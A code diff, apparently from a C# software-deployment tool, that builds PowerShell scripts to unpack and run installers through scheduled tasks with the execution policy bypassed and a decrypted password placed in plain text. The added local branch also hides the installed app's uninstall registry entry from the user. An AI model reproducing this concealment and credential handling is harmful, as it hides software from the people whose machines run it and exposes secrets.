-    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
-    Start-Sleep -Seconds 5  # Small delay to ensure cleanup
-}}
-
-# Unzip the file
-Expand-Archive -Path '{zipFilePath}' -DestinationPath '{extractionPath}' -Force
-
-# Get the path to the installer executable
-$installerPath = '{Path.Combine(extractionPath, installerExeName)}'
-
-# Convert password to SecureString
-$securePassword = ConvertTo-SecureString '{password}' -AsPlainText -Force
-
-# Create a credential object
-$credential = New-Object System.Management.Automation.PSCredential('{username}', $securePassword)
-
-# Define the scheduled task action
-$action = New-ScheduledTaskAction -Execute $installerPath -Argument '{parameters}'
-
-# Define the trigger (run immediately)
-$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(10)
-
-# Define the principal with elevation
-$principal = New-ScheduledTaskPrincipal -UserId '{username}' -LogonType Password -RunLevel Highest
-
-# Register the scheduled task
-Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -User '{username}' -Password '{password}'
-
-# Start the scheduled task
-Start-ScheduledTask -TaskName $taskName
-
-# Wait for 15 minutes (900 seconds)
-#Start-Sleep -Seconds 900
-
-# Delete the installer and extracted files
-#if (Test-Path $installerPath) {{
-    #Remove-Item -Path $installerPath -Force
-#}}
-
-#if (Test-Path '{extractionPath}') {{
-   # Remove-Item -Path '{extractionPath}' -Recurse -Force
-#}}
-
-# Delete the ZIP file
-#if (Test-Path '{zipFilePath}') {{
-    #Remove-Item -Path '{zipFilePath}' -Force
-#}}
-
-# Clean up the scheduled task
-#Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
-";
-
-
-            await Task.Run(() => ExecutePowerShellScript(psScript));
+            string value = Decrypt(encryptedPassword, useHashing: true);
+            string text = Path.Combine(workingDirectory + "\\", Path.GetFileNameWithoutExtension(zipFilePath));
+            if (!isLocal)
+            {
+                string psScript = $"\r\n# Ensure the module is loaded (Optional: You can skip if not needed)\r\n$env:PSModulePath += ';C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules';\r\nSet-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force;\r\nImport-Module ScheduledTasks;\r\nImport-Module Microsoft.PowerShell.Archive;\r\n\r\n# Task Name\r\n$taskName = 'SMM_TemporaryInstallationTask'\r\n\r\n# Unregister existing scheduled task if present\r\nif (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {{\r\n    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false\r\n    Start-Sleep -Seconds 5  # Small delay to ensure cleanup\r\n}}\r\n\r\n# Unzip the file\r\nExpand-Archive -Path '{zipFilePath}' -DestinationPath '{text}' -Force\r\n\r\n# Get the path to the installer executable\r\n$installerPath = '{Path.Combine(text, installerExeName)}'\r\n\r\n# Convert password to SecureString\r\n$securePassword = ConvertTo-SecureString '{value}' -AsPlainText -Force\r\n\r\n# Create a credential object\r\n$credential = New-Object System.Management.Automation.PSCredential('{username}', $securePassword)\r\n\r\n# Define the scheduled task action\r\n$action = New-ScheduledTaskAction -Execute $installerPath -Argument '{parameters}'\r\n\r\n# Define the trigger (run immediately)\r\n$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(10)\r\n\r\n# Define the principal with elevation\r\n$principal = New-ScheduledTaskPrincipal -UserId '{username}' -LogonType Password -RunLevel Highest\r\n\r\n# Register the scheduled task\r\nRegister-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -User '{username}' -Password '{value}'\r\n\r\n# Start the scheduled task\r\nStart-ScheduledTask -TaskName $taskName\r\n\r\n# Wait for 15 minutes (900 seconds)\r\n#Start-Sleep -Seconds 900\r\n\r\n# Delete the installer and extracted files\r\n#if (Test-Path $installerPath) {{\r\n    #Remove-Item -Path $installerPath -Force\r\n#}}\r\n\r\n#if (Test-Path '{text}') {{\r\n   # Remove-Item -Path '{text}' -Recurse -Force\r\n#}}\r\n\r\n# Delete the ZIP file\r\n#if (Test-Path '{zipFilePath}') {{\r\n    #Remove-Item -Path '{zipFilePath}' -Force\r\n#}}\r\n\r\n# Clean up the scheduled task\r\n#Unregister-ScheduledTask -TaskName $taskName -Confirm:$false\r\n";
+                await Task.Run(() => ExecutePowerShellScript(psScript));
+            }
+            else
+            {
+                string psScript2 = $"\r\n$env:PSModulePath += ';C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules'\r\nSet-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force\r\nImport-Module ScheduledTasks\r\nImport-Module Microsoft.PowerShell.Archive\r\n\r\n$taskName = 'SMM_TemporaryInstallationTask'\r\n\r\n# Remove existing task\r\nif (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {{\r\n    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false\r\n    Start-Sleep -Seconds 5\r\n}}\r\n\r\n# Extract installer\r\nExpand-Archive -Path '{zipFilePath}' -DestinationPath '{text}' -Force\r\n$installerPath = '{Path.Combine(text, installerExeName)}'\r\n\r\n# Schedule task\r\n$action = New-ScheduledTaskAction -Execute $installerPath -Argument '{parameters}'\r\n$trigger = New-ScheduledTaskTrigger -Once -At ((Get-Date).AddSeconds(10))\r\n$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Limited\r\n$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries\r\n\r\nRegister-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings\r\nStart-ScheduledTask -TaskName $taskName\r\n\r\nStart-Sleep -Seconds 45\r\n\r\n# === Auto-detect Uninstall Registry Key and Hide It ===\r\n$displayNameToFind = '{installerExeName.Split('.')[0]}'  # Example: 'My Cool App'\r\n$uninstallBasePath = 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall'\r\n\r\n$uninstallKey = Get-ChildItem -Path $uninstallBasePath | Where-Object {{\r\n    (Get-ItemProperty $_.PSPath).DisplayName -eq $displayNameToFind\r\n}}\r\n\r\nif ($uninstallKey) {{\r\n    Set-ItemProperty -Path $uninstallKey.PSPath -Name 'SystemComponent' -Value 1 -Force\r\n}}\r\n\r\n# Optional cleanup\r\n# Start-Sleep -Seconds 900\r\n# if (Test-Path $installerPath) {{ Remove-Item -Path $installerPath -Force }}\r\n# if (Test-Path '{text}') {{ Remove-Item -Path '{text}' -Recurse -Force }}\r\n# if (Test-Path '{zipFilePath}') {{ Remove-Item -Path '{zipFilePath}' -Force }}\r\n# Unregister-ScheduledTask -TaskName $taskName -Confirm:$false\r\n";
+                Console.WriteLine("Async Task Started");
+                await Task.Run(() => ExecutePowerShellScript(psScript2));
+                Console.WriteLine("Async Task Stopped");
+            }
         }
 
 
